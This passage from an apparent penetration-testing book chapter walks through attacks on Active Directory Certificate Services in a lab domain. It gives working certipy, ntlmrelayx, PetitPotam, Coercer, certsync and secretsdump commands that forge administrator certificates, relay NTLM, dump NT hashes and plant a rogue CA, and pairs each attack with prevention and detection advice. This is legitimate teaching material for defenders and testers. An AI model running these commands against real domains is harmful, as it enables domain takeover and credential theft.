<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.29 – Vulnerable template adjusted to fit the ESC1 attack path</p>
<p>Now, we can <a id="_idIndexMarker804"/>abuse the<a id="_idIndexMarker805"/> misconfigured template in the same way as in the <span class="No-Break">ESC1 attack:</span></p>
<pre class="console">
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC4 -ca 'ESSOS-CA' -upn administrator@essos.local
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12</pre> <p>As a result, it was possible to request a certificate and obtain a TGT as <span class="No-Break">domain administrator.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer240">
<img alt="Figure 8.30 – Successful exploitation of ESC4" height="610" src="image/B18964_08_30.jpg" width="1301"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.30 – Successful exploitation of ESC4</p>
<p>To prevent<a id="_idIndexMarker806"/> this <a id="_idIndexMarker807"/>attack, it is recommended to regularly review the certificate’s ACLs to ensure that high privileges are assigned only to the correct group of users. Detection is possible via event ID <strong class="source-inline">5136</strong>, but it requires adjustment in the auditing policy. This event ID monitors the modifications of the critical certificate template attributes that we changed previously. Another helpful thing for detecting the event ID is <strong class="source-inline">4899</strong>. However, there is no information in the event log on which account made changes and this event will be logged only after enrollment with a modified template happens[20]. The SACL on the template AD object can be enforced as well, giving a more granular view in event <span class="No-Break">ID </span><span class="No-Break"><strong class="source-inline">4662</strong></span><span class="No-Break">.</span></p>
<h3>ESC5 – Vulnerable PKI object access control</h3>
<p>If an adversary has certain privileges<a id="_idIndexMarker808"/> over the<a id="_idIndexMarker809"/> following objects, it is possible to compromise the entire <span class="No-Break">PKI system:</span></p>
<ul>
<li>CA server’s <span class="No-Break">computer account</span></li>
<li>CA server’s <span class="No-Break">RPC/DCOM server</span></li>
<li>Any descendent object/container in the <strong class="source-inline">CN=Public </strong><span class="No-Break"><strong class="source-inline">Key Services,CN=Services,</strong></span><strong class="source-inline"> CN=Configuration,DC=&lt;COMPANY&gt;,or </strong><span class="No-Break"><strong class="source-inline">DC=&lt;COM&gt;</strong></span><span class="No-Break"> container</span></li>
</ul>
<p>For example, let us cover the following scenario. An adversary was able to compromise the CA server’s computer account through RBCD. After getting the access, the NT hash of the domain account with local administrative privileges on the CA server was dumped. The adversary now can forge a Golden Certificate. To replicate this attack, I will add <strong class="source-inline">viserys.targaryen</strong> to the local <span class="No-Break">administrator’s group.</span></p>
<p>As a local administrator, it is possible to back up the CA certificate and private key with the <span class="No-Break">following command:</span></p>
<pre class="console">
certipy-ad ca -backup -u viserys.targaryen -p GoldCrown -ca ESSOS-CA -target 192.168.56.23</pre> <p>Next, we will forge a<a id="_idIndexMarker810"/> certificate<a id="_idIndexMarker811"/> for the domain administrator and use it for authentication. Keep in mind that the <strong class="source-inline">-template</strong> option is used to avoid the Kerberos <strong class="source-inline">KDC_ERR_CLIENT_NOT_TRUSTED</strong> error, which means <span class="No-Break">incorrect forging:</span></p>
<pre class="console">
Certipy-ad forge -ca-pfx ESSOS-CA.pfx -upn Administrator@essos.local -subject 'CN=Administrator,CN=Users,DC=essos,DC=local' -template khal.drogo.pfx
certipy-ad auth -pfx administrator_forged.pfx -dc-ip 192.168.56.12</pre> <p>The result of the attack is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer241">
<img alt="Figure 8.31 – Successful exploitation of ESC5" height="756" src="image/B18964_08_31.jpg" width="1206"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.31 – Successful exploitation of ESC5</p>
<p>Another technique, called <strong class="source-inline">CertSync</strong>, was<a id="_idIndexMarker812"/> recently published. It allows dumping <strong class="source-inline">ntds.dit</strong> remotely<a id="_idIndexMarker813"/> without <a id="_idIndexMarker814"/>DRSUAPI by combining the Golden Certificate and UnPAC-the-hash[21]. Obviously, privileged access to the CA is required. A Golden Certificate is a certificate that is forged with the private key of the CA certificate. We will cover forgery in more detail later when we explore domain persistence techniques. The steps of a C<strong class="source-inline">ertSync</strong> attack are <span class="No-Break">as follows:</span></p>
<ol>
<li>Dump the list of users, CA information, and CRL <span class="No-Break">from LDAP.</span></li>
<li>Dump the CA certificate and <span class="No-Break">private key.</span></li>
<li>Forge offline a certificate for <span class="No-Break">every user.</span></li>
<li>UnPAC-the-hash for every user to obtain the <span class="No-Break">NT hash.</span></li>
</ol>
<p>The command to launch the attack is <span class="No-Break">as follows:</span></p>
<pre class="console">
certsync -u viserys.targaryen -p GoldCrown -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12</pre> <p>As a result, NT hashes of all users <span class="No-Break">are dumped:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer242">
<img alt="Figure 8.32 – Successful certsync attack" height="504" src="image/B18964_08_32.jpg" width="1253"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.32 – Successful certsync attack</p>
<p>The tool also has options to improve OpSec (e.g., apply timeout between authentication requests, mimic existing <span class="No-Break">templates, etc.).</span></p>
<p>Another exciting piece of research was published by <em class="italic">SpecterOps</em> about elevating to Enterprise Administrator from Domain Administrator by using ESC5. You can read <span class="No-Break">more here[22].</span></p>
<p>To prevent ESC5, apply hardening to the CA server and ensure that only necessary accounts can access it. Detection is possible via the monitoring of certificate template modifications by <span class="No-Break">auditing SACLs.</span></p>
<h3>ESC7 – Vulnerable certificate authority access control</h3>
<p>This attack is possible <a id="_idIndexMarker815"/>when ACLs on the <a id="_idIndexMarker816"/>CA itself are not tight enough. The two main rights we are interested in are <strong class="source-inline">ManageCA</strong> (CA administrator) and <strong class="source-inline">Issue and Manage Certificates</strong> (certificate manager). <strong class="source-inline">ManageCA</strong> allows the addition of the <strong class="source-inline">EDITF_ATTRIBUTESUBJECTALTNAME2</strong> flag, effectively making CA prone to ESC6 attack. However, a service restart will be required to introduce this change. Also, the installed May 2022 security updates kill ESC6. A good example of how to turn excessive rights into ESC6 with the help of the PowerShell PSPKI module can be <span class="No-Break">found here[23].</span></p>
<p>However, the <strong class="source-inline">ManageCA</strong> permission allows you to grant yourself <strong class="source-inline">Issue and Manage Certificates</strong> access rights. This role allows us to approve pending requests, negating the manager approval issuance requirement. Now, we can combine new rights to execute an attack. The default <strong class="source-inline">SubCA</strong> template is vulnerable to ESC1 and has the <strong class="source-inline">Any purpose</strong> EKU. An adversary can request a certificate using the <strong class="source-inline">SubCA</strong> template, but the request will be denied because only administrators can enroll in it. However, requests can be manually approved using an account with <strong class="source-inline">ManageCA</strong> and <strong class="source-inline">Issue and Manage Certificates</strong> permissions. It is important to note that both permissions are required. The certificate can then be manually retrieved and used for <span class="No-Break">domain authentication.</span></p>
<p>To show the <a id="_idIndexMarker817"/>preceding <a id="_idIndexMarker818"/>scenario, I will grant the <strong class="source-inline">khal.drogo</strong> user <strong class="source-inline">ManageCA</strong> permission. This can be granted in the <strong class="bold">Security</strong> tab of <strong class="bold">CA Properties</strong> in <strong class="bold">Certification Authority (certsrv) MMC</strong>. We will start with the ACL enumeration of the CA. We can use a PowerShell module called PSPKI or <strong class="source-inline">Certify.exe</strong> with the <strong class="source-inline">cas</strong> parameter. It will show that <strong class="source-inline">khal.drogo</strong> has the <span class="No-Break"><strong class="source-inline">ManageCA</strong></span><span class="No-Break"> right.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer243">
<img alt="Figure 8.33 – ACL enumeration of the ESSOS-CA" height="177" src="image/B18964_08_33.jpg" width="1303"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.33 – ACL enumeration of the ESSOS-CA</p>
<p>We will grant the <strong class="source-inline">khal.drogo</strong> user <strong class="source-inline">Issue and Manage Certificates</strong> rights, also known as O<strong class="source-inline">fficer</strong>. Then, we will enable the <strong class="source-inline">SubCA</strong> template if it <span class="No-Break">was disabled:</span></p>
<pre class="console">
certipy-ad ca -u khal.drogo@essos.local -p horse -ca 'ESSOS-CA' -target braavos.essos.local -add-officer khal.drogo
certipy-ad ca -u khal.drogo@essos.local -p horse -ca 'ESSOS-CA' -target braavos.essos.local -enable-template SubCA</pre> <p>The result of the execution of the preceding command is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer244">
<img alt="Figure 8.34 – Enabling the SubCA template and granting the officer right to khal.drogo" height="296" src="image/B18964_08_34.jpg" width="1435"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.34 – Enabling the SubCA template and granting the officer right to khal.drogo</p>
<p>We will launch <a id="_idIndexMarker819"/>the attack<a id="_idIndexMarker820"/> by requesting a certificate using the <strong class="source-inline">SubCA</strong> template, manually approving it, and lastly, retrieving the issued certificate. The following commands will execute <span class="No-Break">the attack:</span></p>
<pre class="console">
certipy-ad req -u khal.drogo@essos.local -p horse -ca ESSOS-CA -target braavos.essos.local -template SubCA -upn administrator@essos.local
certipy-ad ca -u khal.drogo@essos.local -p horse -ca ESSOS-CA -target braavos.essos.local -issue-request 19
certipy-ad req -u khal.drogo@essos.local -p horse -ca ESSOS-CA -target braavos.essos.local -retrieve 19
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12</pre> <p>The result of the preceding commands is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer245">
<img alt="Figure 8.35 – Successful ESC7 attack" height="1082" src="image/B18964_08_35.jpg" width="1352"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.35 – Successful ESC7 attack</p>
<p>There is <a id="_idIndexMarker821"/>some <a id="_idIndexMarker822"/>intriguing research published by <em class="italic">Tarlogic</em>. It shows that it is possible to achieve remote code execution by uploading a web shell if an adversary has <strong class="source-inline">ManageCA</strong> permissions. Research can be <span class="No-Break">found here[24].</span></p>
<p>To prevent ESC7, review principals with sensitive security permissions over the CA. Detection is possible via the Sysmon registry rule for the scenario when the <strong class="source-inline">EDITF_ATTRIBUTESUBJECTALTNAME2</strong> flag will be set by an attacker. A change of the CA security permissions generates event ID <strong class="source-inline">4882</strong>, as <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer246">
<img alt="Figure 8.36 – khal.drogo added Certificate Manager permissions" height="328" src="image/B18964_08_36.jpg" width="377"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.36 – khal.drogo added Certificate Manager permissions</p>
<p>The next section will demonstrate that, in the past, the default CA configuration led to a complete AD <span class="No-Break">CS takeover.</span></p>
<h2 id="_idParaDest-167"><a id="_idTextAnchor183"/>CA misconfiguration</h2>
<p>Now we are going to touch upon an<a id="_idIndexMarker823"/> attack that was patched by Microsoft in May 2022, but you <a id="_idIndexMarker824"/>still may encounter it in <span class="No-Break">older environments.</span></p>
<h3>ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2</h3>
<p>If the <strong class="source-inline">EDITF_ATTRIBUTESUBJECTALTNAME2</strong> flag <a id="_idIndexMarker825"/>is set on the CA, any request can have defined values in the subject alternative name. Effectively, any domain user can enroll in any template configured for domain authentication and obtain a certificate as any other user, including the domain administrator. The difference from ESC1 is that account information is stored in a certificate attribute, not in a certificate extension. This flag is stored in the registry and can be verified with <strong class="source-inline">certutil.exe/certify</strong> from an unelevated context; however, a remote registry service should be up and running if the check is happening over <span class="No-Break">the network:</span></p>
<pre class="console">
certutil -config "braavos\ESSOS-CA" -getreg "policy\EditFlags"</pre> <p>Certify will detect this flag and raise <span class="No-Break">an issue:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer247">
<img alt="Figure 8.37 – Flag is set" height="60" src="image/B18964_08_37.jpg" width="1407"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.37 – Flag is set</p>
<p>Exploitation<a id="_idIndexMarker826"/> is relatively straightforward. We request a user certificate with the domain administrator as an <span class="No-Break">alternative name:</span></p>
<pre class="console">
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca 'ESSOS-CA' -upn administrator@essos.local
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12</pre> <p>The result is in the <a id="_idIndexMarker827"/><span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer248">
<img alt="Figure 8.38 – Successful ESC6 attack" height="641" src="image/B18964_08_38.jpg" width="1134"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.38 – Successful ESC6 attack</p>
<p>To prevent this attack, disable the flag with the following command (domain administrator privileges required) and restart <span class="No-Break">the service:</span></p>
<pre class="console">
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</pre> <p>The <a id="_idIndexMarker828"/>May 2022 security updates kill ESC6; now, it works only combined with<a id="_idIndexMarker829"/> ESC10. The patch enforced new certificates to have a security extension that embeds the requester’s <strong class="source-inline">objectSid</strong> property, not the value <span class="No-Break">from SAN.</span></p>
<p>In the next section, we will revisit relay attacks from <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a>, but only in new ways that apply to <span class="No-Break">AD CS.</span></p>
<h2 id="_idParaDest-168"><a id="_idTextAnchor184"/>Relay attacks</h2>
<p>We discussed relay attacks<a id="_idIndexMarker830"/> before in <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a>. Here, we will just revisit them but now with a<a id="_idIndexMarker831"/> focus on <span class="No-Break">AD CS.</span></p>
<h3>ESC8 – NTLM relay to AD CS HTTP endpoints</h3>
<p>If additional AD CS <a id="_idIndexMarker832"/>server roles are installed, they may<a id="_idIndexMarker833"/> introduce several HTTP-based enrollment methods. These HTTP-based enrollment methods are vulnerable to NTLM or Kerberos relay attacks. An adversary<a id="_idIndexMarker834"/> uses <strong class="source-inline">PetitPotam</strong>, for example, to coerce NTLM authentication from the domain controller to the host of choice. Then, NTLM credentials are relayed to the AD CS web enrollment page and a domain controller certificate is issued. Using this certificate, an adversary will request a TGT and access the domain controller via pass-the-certificate. There are various versions of how this attack can be performed depending on available tools and protocols[25]. We will stick to the Linux way, following the walk-through of the lab <span class="No-Break">author, </span><span class="No-Break"><em class="italic">Mayfly</em></span><span class="No-Break">[26]:</span></p>
<ol>
<li>Find enrollment endpoints by using <strong class="source-inline">Certify.exe</strong> with the <span class="No-Break"><strong class="source-inline">cas</strong></span><span class="No-Break"> parameter.</span></li>
<li>Create a listener on our Kali machine to relay SMB authentication to the AD CS <span class="No-Break">HTTP endpoint:</span><pre class="source-code">
<strong class="bold">impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</strong></pre><p class="list-inset">We chose the <strong class="source-inline">DomainController</strong> template because we target the domain controller. If we target a workstation, we can use a <strong class="source-inline">Machine</strong> template, and for the domain user, the <span class="No-Break"><strong class="source-inline">User</strong></span><span class="No-Break"> template.</span></p></li> <li>Coerce authentication with <strong class="source-inline">PetitPotam</strong>; however, you can choose any other method <span class="No-Break">as well:</span><pre class="source-code">
<strong class="bold">python3 PetitPotam.py 192.168.56.100 meereen.essos.local</strong></pre></li> <li>Get the certificate<a id="_idIndexMarker835"/> after <span class="No-Break">coerced </span><span class="No-Break"><a id="_idIndexMarker836"/></span><span class="No-Break">authentication:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer249">
<img alt="Figure 8.39 – Obtain the domain controller’s computer account certificate" height="317" src="image/B18964_08_39.jpg" width="1570"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.39 – Obtain the domain controller’s computer account certificate</p>
<ol>
<li value="5">Request a TGT by <span class="No-Break">using pass-the-certificate:</span><pre class="source-code">
<strong class="bold">python3 gettgtpkinit.py -pfx-base64 $(cat /home/kali/cert.b64) -dc-ip 192.168.56.12 'essos.local/meereen$' 'meereen.ccache'</strong></pre></li> <li>Using the TGT, obtain the NT hash <span class="No-Break">of </span><span class="No-Break"><strong class="source-inline">daenerys.targaryen</strong></span><span class="No-Break">:</span><pre class="source-code">
<strong class="bold">export KRB5CCNAME=meereen.ccache</strong>
<strong class="bold">impacket-secretsdump -k -no-pass -just-dc-user daenerys.targaryen ESSOS.LOCAL/'meereen$'@meereen.essos.local</strong></pre><p class="list-inset">The result of the attack is in the <span class="No-Break">following screenshot:</span></p></li> </ol>
<div>
<div class="IMG---Figure" id="_idContainer250">
<img alt="Figure 8.40 – Successful ESC8 attack" height="735" src="image/B18964_08_40.jpg" width="1533"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.40 – Successful ESC8 attack</p>
<p>Certipy-ad also has this <span class="No-Break">attack embedded:</span></p>
<pre class="console">
certipy-ad relay -ca 192.168.56.23 -template DomainController
certipy-ad auth -pfx meereen.pfx -dc-ip 192.168.56.12</pre> <p>After using any of <a id="_idIndexMarker837"/>the coerce methods, we <a id="_idIndexMarker838"/>obtained the certificate and <span class="No-Break">NT hash:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer251">
<img alt="Figure 8.41 – Successful ESC8 attack" height="587" src="image/B18964_08_41.jpg" width="1289"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.41 – Successful ESC8 attack</p>
<p>The prevention <a id="_idIndexMarker839"/>recommendations are to enable <strong class="bold">Extended Protection for Authentication</strong> (<strong class="bold">EPA</strong>) for Certificate Enrollment Web<a id="_idIndexMarker840"/> Service, disable unused AD CS<a id="_idIndexMarker841"/> HTTP endpoints, and disable NTLM authentication at the host and IIS level. Detection is possible via event ID <strong class="source-inline">4624</strong> on the CA server from machine accounts using NTLM and event ID <strong class="source-inline">4768</strong> where the domain controller’s computer account certificate is used to request <span class="No-Break">the TGT.</span></p>
<h3>ESC11 – NTLM relay to RPC endpoint</h3>
<p>This attack is similar to <a id="_idIndexMarker842"/>ESC8, but the relay is done to the RPC endpoint, not <a id="_idIndexMarker843"/>the HTTP one. Original research can be found here[27]. The certificate request is sent to the RPC endpoint over <a id="_idIndexMarker844"/>the <strong class="bold">ICertPassage Remote</strong> (<strong class="bold">ICPR</strong>) protocol. There are two conditions to be met in order for an attack to <span class="No-Break">be successful:</span></p>
<ul>
<li>The <strong class="source-inline">IF_ENFORCEENCRYPTICERTREQUEST</strong> flag is not set (it is set <span class="No-Break">by default)</span></li>
<li>NTLM signing is <span class="No-Break">not required</span></li>
</ul>
<p>Back compatibility with <a id="_idIndexMarker845"/>older OS versions (&lt; Windows Server 2012) can be the reason for the flag to be unset. For demonstration purposes, we will unset it on <strong class="source-inline">braavos.essos.local</strong> machine by running the following command from the <span class="No-Break">elevated context:</span></p>
<pre class="console">
certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc &amp; net start certsvc</pre> <p>The following <a id="_idIndexMarker846"/>steps will successfully emulate <span class="No-Break">the attack:</span></p>
<ol>
<li>Check whether the CA is vulnerable to ESC11 by <span class="No-Break">using </span><span class="No-Break"><strong class="source-inline">certipy</strong></span><span class="No-Break">:</span><pre class="source-code">
<strong class="bold">certipy find -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -stdout</strong></pre><p class="list-inset">The result is <span class="No-Break">shown here:</span></p></li> </ol>
<div>
<div class="IMG---Figure" id="_idContainer252">
<img alt="Figure 8.42 – CA is vulnerable to ESC11" height="30" src="image/B18964_08_42.jpg" width="1171"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.42 – CA is vulnerable to ESC11</p>
<ol>
<li value="2">Launch the listener with the <strong class="source-inline">DomainController</strong> template targeting <span class="No-Break">the CA:</span><pre class="source-code">
<strong class="bold">certipy relay -target 'rpc://braavos.essos.local' -ca 'ESSOS-CA' -template DomainController</strong></pre></li> <li>Coerce authentication by using the <span class="No-Break"><strong class="source-inline">Coercer</strong></span><span class="No-Break"> tool:</span><pre class="source-code">
<strong class="bold">python3 Coercer.py coerce -u 'khal.drogo' -p 'horse' --target-ip 192.168.56.12 --listener-ip 192.168.56.100</strong></pre></li> <li>Authenticate using the domain controller’s computer <span class="No-Break">account certificate:</span><pre class="source-code">
<strong class="bold">certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12</strong></pre><p class="list-inset">The result is shown in the <span class="No-Break">following screenshot:</span></p></li> </ol>
<div>
<div class="IMG---Figure" id="_idContainer253">
<img alt="Figure 8.43 – Successful ESC11 attack" height="716" src="image/B18964_08_43.jpg" width="1291"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.43 – Successful ESC11 attack</p>
<p>To mitigate<a id="_idIndexMarker847"/> this attack, enforce packet signing and encryption by setting the <strong class="source-inline">IF_ENFORCEENCRYPTICERTREQUEST</strong> flag. Detection recommendations are<a id="_idIndexMarker848"/> the same as <span class="No-Break">for ESC8.</span></p>
<p>In the next section, we will discuss possible ways to achieve persistence in the domain by abusing built-in AD <span class="No-Break">CS functionality.</span></p>
<h1 id="_idParaDest-169"><a id="_idTextAnchor185"/>Domain persistence</h1>
<p>In this section, we will explore techniques<a id="_idIndexMarker849"/> to achieve persistence in the domain using a compromised CA. We will gain an understanding of the typical vectors an adversary will utilize to keep high-privileged access to the environment and explore approaches to detect <span class="No-Break">such activities.</span></p>
<h2 id="_idParaDest-170"><a id="_idTextAnchor186"/>DPERSIST1 – Forge certificates with stolen CA certificate</h2>
<p>If an adversary<a id="_idIndexMarker850"/> has compromised a CA and obtained a CA certificate with a corresponding private key, it is possible to forge any certificate in the domain environment. To differentiate the CA certificate from others, pay attention to certain characteristics such as <span class="No-Break">the following:</span></p>
<ul>
<li>The issuer and subject are set to the distinguished name of <span class="No-Break">the CA</span></li>
<li>It has a “CA <span class="No-Break">Version” extension</span></li>
<li><span class="No-Break">No EKU</span></li>
</ul>
<p>These characteristics are shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer254">
<img alt="Figure 8.44 – CA certificate information" height="537" src="image/B18964_08_44.jpg" width="747"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.44 – CA certificate information</p>
<p>It is important <a id="_idIndexMarker851"/>to mention that forged certificates cannot be revoked because the CA is not aware of their existence. One of the scenarios of how to obtain a CA certificate was explained in the ESC5 example. If you need to forge <a id="_idIndexMarker852"/>the certificate on a Windows machine, there is a tool called <strong class="source-inline">ForgeCert</strong>[28] to <span class="No-Break">assist you.</span></p>
<p>Ideally, the CA should be treated as a critical asset from a security point of view. The root CA can be put offline and delegate certificate issuance to the subordinate CA. In case of a compromise, the root CA still will be secure and can revoke the subordinate CA certificate. The private key of the CA certificate should be stored separately on a hardware device with all physical security measures <span class="No-Break">in place.</span></p>
<h2 id="_idParaDest-171"><a id="_idTextAnchor187"/>DPERSIST2 – Trusting rogue CA certificates</h2>
<p>During <a id="_idIndexMarker853"/>authentication, the domain controller checks the <strong class="source-inline">NTAuthCertificates</strong> object for a CA entry, which is specified in the <strong class="source-inline">Issuer</strong> field. The idea of this technique is to generate a self-signed rogue CA certificate and add it to the <strong class="source-inline">NTAuthCertificates</strong> Active Directory object. After that, any forged certificate signed by a rogue CA certificate will be valid. An adversary needs high-privileged access to be able to push rogue certificates to the <strong class="source-inline">NTAuthCertificates</strong> object. It can be done by the <span class="No-Break">following command:</span></p>
<pre class="console">
certutil.exe -dspublish -f C:\Users\Public\RogueCA.crt NTAuthCA</pre> <p>Such activity can be detected if SACL audit for <strong class="source-inline">Write</strong> and <strong class="source-inline">Modify</strong> actions against the <strong class="source-inline">CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local</strong> object is enabled. This will generate event <span class="No-Break">ID </span><span class="No-Break"><strong class="source-inline">5136</strong></span><span class="No-Break">.</span></p>
<h2 id="_idParaDest-172"><a id="_idTextAnchor188"/>DPERSIST3 – Malicious misconfiguration</h2>
<p>With<a id="_idIndexMarker854"/> high-privileged access to the CA, an adversary can achieve persistence by introducing malicious misconfiguration via security descriptor modifications of AD CS components. In this case, the only limit is the attacker’s imagination. All attacks from the domain privilege escalation section can be implemented together with additional excessive permissions set on the key elements of AD CS. Detection of this technique is quite difficult. Event ID <strong class="source-inline">4882</strong>, as shown in ESC7, will be logged every time security permissions for certificate services are changed. Also, the SACL audit of critical AD objects will <span class="No-Break">be helpful.</span></p>
<h1 id="_idParaDest-173"><a id="_idTextAnchor189"/>Summary</h1>
<p>In this chapter, we learned about techniques to compromise AD CS. The techniques presented in the chapter were grouped into four categories: theft, account persistence, domain privilege escalation, and <span class="No-Break">domain persistence.</span></p>
<p>In the theft category, we covered different ways to steal certificates from a compromised endpoint. Next, we introduced you to account persistence techniques, such as the request and renewal of user and machine certificates. Also, we learned about domain privilege escalation and persistence techniques, respectively, to achieve the highest privileges on the domain level <span class="No-Break">as well.</span></p>
<p>In the next chapter, we will dive into Microsoft’s solution for databases – Microsoft SQL Server. We will cover offensive techniques, prevention, and <span class="No-Break">detection recommendations.</span></p>
<h1 id="_idParaDest-174"><a id="_idTextAnchor190"/>References</h1>
<ol>
<li>SpecterOps – Certified <span class="No-Break">Pre-Owned: </span><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"><span class="No-Break">https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf</span></a></li>
<li>Microsoft official documentation about AD <span class="No-Break">CS: </span><a href="https://learn.microsoft.com/en-us/training/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs"><span class="No-Break">https://learn.microsoft.com/en-us/training/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs</span></a></li>
<li>PassTheCert <span class="No-Break">tool: </span><a href="https://github.com/AlmondOffSec/PassTheCert"><span class="No-Break">https://github.com/AlmondOffSec/PassTheCert</span></a></li>
<li>Certificate authentication without <span class="No-Break">PKINIT: </span><a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.xhtml"><span class="No-Break">https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.xhtml</span></a></li>
<li>Hunting for AD CS <span class="No-Break">abuse: </span><a href="https://speakerdeck.com/heirhabarov/hunting-for-active-directory-certificate-services-abuse"><span class="No-Break">https://speakerdeck.com/heirhabarov/hunting-for-active-directory-certificate-services-abuse</span></a></li>
<li>CertStealer <span class="No-Break">tool: </span><a href="https://github.com/TheWover/CertStealer"><span class="No-Break">https://github.com/TheWover/CertStealer</span></a></li>
<li>SharpDPAPI <span class="No-Break">tool: </span><a href="https://github.com/GhostPack/SharpDPAPI"><span class="No-Break">https://github.com/GhostPack/SharpDPAPI</span></a></li>
<li>Detecting UnPAC-the-hash and Shadow Credentials <span class="No-Break">attacks: </span><a href="https://medium.com/falconforce/falconfriday-detecting-unpacing-and-shadowed-credentials-0xff1e-2246934247ce"><span class="No-Break">https://medium.com/falconforce/falconfriday-detecting-unpacing-and-shadowed-credentials-0xff1e-2246934247ce</span></a></li>
<li>Certify <span class="No-Break">tool: </span><a href="https://github.com/GhostPack/Certify"><span class="No-Break">https://github.com/GhostPack/Certify</span></a></li>
<li>Shadow Credentials <span class="No-Break">attack: </span><a href="https://shenaniganslabs.io/2021/06/21/Shadow-Credentials.xhtml"><span class="No-Break">https://shenaniganslabs.io/2021/06/21/Shadow-Credentials.xhtml</span></a></li>
<li>Whisker <span class="No-Break">tool: </span><a href="https://github.com/eladshamir/Whisker"><span class="No-Break">https://github.com/eladshamir/Whisker</span></a></li>
<li>AD CS cheat <span class="No-Break">sheet: </span><a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services"><span class="No-Break">https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services</span></a></li>
<li>Certifried original <span class="No-Break">research: </span><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"><span class="No-Break">https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4</span></a></li>
<li>Certipy <span class="No-Break">tool: </span><a href="https://github.com/ly4k/Certipy"><span class="No-Break">https://github.com/ly4k/Certipy</span></a></li>
<li>Semperis write-up for <span class="No-Break">CVE-2022-26923: </span><a href="https://www.semperis.com/blog/ad-vulnerability-cve-2022-26923/"><span class="No-Break">https://www.semperis.com/blog/ad-vulnerability-cve-2022-26923/</span></a></li>
<li>ESC9 and ESC10 author’s blog <span class="No-Break">post: </span><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"><span class="No-Break">https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7</span></a></li>
<li>Microsoft patch for <span class="No-Break">Certifried: </span><a href="https://catalog.update.microsoft.com/Search.aspx?q=KB5025228"><span class="No-Break">https://catalog.update.microsoft.com/Search.aspx?q=KB5025228</span></a></li>
<li>The modifyCertTemplate <span class="No-Break">tool: </span><a href="https://github.com/fortalice/modifyCertTemplate"><span class="No-Break">https://github.com/fortalice/modifyCertTemplate</span></a></li>
<li>Exploit ESC4 using <span class="No-Break">PowerView: </span><a href="https://redteam.wiki/postexploitation/active-directory/adcs/esc4"><span class="No-Break">https://redteam.wiki/postexploitation/active-directory/adcs/esc4</span></a></li>
